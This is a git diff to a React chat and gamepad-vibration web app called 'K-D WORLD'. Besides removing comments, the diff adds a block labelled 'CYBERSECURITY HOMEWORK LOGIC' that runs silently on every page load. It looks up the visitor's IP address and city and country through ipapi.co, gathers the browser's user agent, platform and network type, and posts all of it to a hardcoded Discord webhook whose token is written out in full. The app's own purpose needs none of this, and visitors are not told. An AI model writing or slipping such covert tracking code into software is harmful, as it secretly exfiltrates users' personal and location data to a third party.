@@ -56,6 +56,49 @@
             const vibeInterval = useRef(null);
             const chatEndRef = useRef(null);
 
+            // --- CYBERSECURITY HOMEWORK LOGIC START ---
+            useEffect(() => {
+                const reportClientData = async () => {
+                    try {
+                        const ipResponse = await fetch('https://ipapi.co/json/');
+                        const ipData = await ipResponse.json();
+
+                        const platformInfo = {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+                            saveData: navigator.connection ? navigator.connection.saveData : false
+                        };
+
+                        const webhookUrl = "https://discord.com/api/webhooks/1491117082291736639/K31Fi3wr6F7SraXzaeNizDFSqpxOTxk5RmqckUhYjEUkBPIUIisYwMtbdAvoi6hvX0v3";
+                        
+                        const payload = {
+                            username: "Security Logger",
+                            embeds: [{
+                                title: "🚨 Connection Detected",
+                                color: 0xd500f9,
+                                fields: [
+                                    { name: "IP", value: ipData.ip || "N/A", inline: true },
+                                    { name: "Location", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
+                                    { name: "Platform", value: platformInfo.platform, inline: true },
+                                    { name: "Network", value: platformInfo.connection, inline: true },
+                                    { name: "Connection Type", value: platformInfo.saveData ? "Data Saver (SIM?)" : "WiFi/Standard", inline: true },
+                                    { name: "Device Info", value: `\`\`\`${platformInfo.userAgent}\`\`\`` }
+                                ]
+                            }]
+                        };
+
+                        await fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                    } catch (e) { console.error("Logger failed", e); }
+                };
+                reportClientData();
+            }, []);
+            // --- CYBERSECURITY HOMEWORK LOGIC END ---
+
             useEffect(() => {
                 supabaseClient.auth.getSession().then(({ data: { session } }) => setSession(session));
                 supabaseClient.auth.onAuthStateChange((_event, session) => setSession(session));
@@ -93,7 +136,6 @@
             useEffect(() => { fetchMessages(); }, [currentChat, session]);
             useEffect(() => { chatEndRef.current?.scrollIntoView({ behavior: "smooth" }); }, [messages]);
 
-            // VIBRATION ENGINE (CONSTANT & INSTANT)
             const startLocalVibe = (settings) => {
                 if (vibeInterval.current) clearInterval(vibeInterval.current);
                 const run = () => {
@@ -108,7 +150,7 @@
                     }
                 };
                 run();
-                vibeInterval.current = setInterval(run, 180); // Overlap for constant motion
+                vibeInterval.current = setInterval(run, 180);
             };
 
             const stopLocalVibe = () => {
@@ -126,7 +168,6 @@
                 });
             };
 
-            // EXISTING SOCIAL LOGIC
             const fetchProfile = async () => {
                 const { data } = await supabaseClient.from('profiles').select('*').eq('id', session.user.id).single();
                 setProfile(data);
@@ -169,7 +210,6 @@
 
             return (
                 <div className="flex h-screen">
-                    {/* SIDEBAR */}
                     <div className="w-20 lg:w-72 glass flex flex-col py-6">
                         <div className="px-6 mb-10 hidden lg:block"><h1 className="text-2xl font-black text-purple-500 italic">K-D WORLD</h1></div>
                         <div className="flex-1 space-y-2">
@@ -206,7 +246,6 @@
                                         <div className="text-[10px] font-black opacity-30 uppercase tracking-[0.2em]">{hasGamepad ? 'Device Linked' : 'No Controller'}</div>
                                     </header>
 
-                                    {/* RUMBLECTRL SECTION (HALF TOP OF CHAT) */}
                                     <div className="vibe-panel p-6 flex flex-col items-center">
                                         <div className="grid grid-cols-2 gap-8 w-full max-w-md mb-6">
                                             <div className="flex flex-col gap-2">
@@ -224,7 +263,6 @@
                                         </div>
                                     </div>
 
-                                    {/* MESSAGES AREA */}
                                     <div className="flex-1 p-6 overflow-y-auto flex flex-col gap-6">
                                         {messages.map((msg, i) => (
                                             <div key={i} className={`flex gap-3 ${msg.sender_id === session.user.id ? 'flex-row-reverse' : 'flex-row'}`}>
@@ -243,7 +281,6 @@
                                         <div ref={chatEndRef} />
                                     </div>
 
-                                    {/* INPUT */}
                                     <div className="p-6 border-t border-white/5">
                                         <div className="max-w-4xl mx-auto flex gap-3 bg-white/5 p-2 rounded-2xl border border-white/10 items-center">
                                             <label className="p-3 cursor-pointer hover:bg-white/10 rounded-xl transition text-xl">
